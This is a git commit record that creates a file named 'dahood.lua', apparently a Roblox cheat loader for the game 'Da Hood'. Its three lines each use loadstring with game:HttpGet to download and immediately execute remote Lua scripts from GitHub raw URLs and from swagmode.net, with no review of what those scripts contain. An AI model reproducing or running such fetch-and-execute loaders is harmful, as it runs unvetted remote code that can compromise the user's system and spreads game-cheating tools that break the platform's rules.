7a5d1d2d8dfb9320ae5cc182696a08cdecebb25a
Fede <riempite.postulato0h@icloud.com>
2024-10-05 22:37:44 +0200

    Create dahood.lua

---
+++ dahood.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nosssa/NossLock/refs/heads/main/WinterTime"))()
+loadstring(game:HttpGet('https://swagmode.net/execute'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
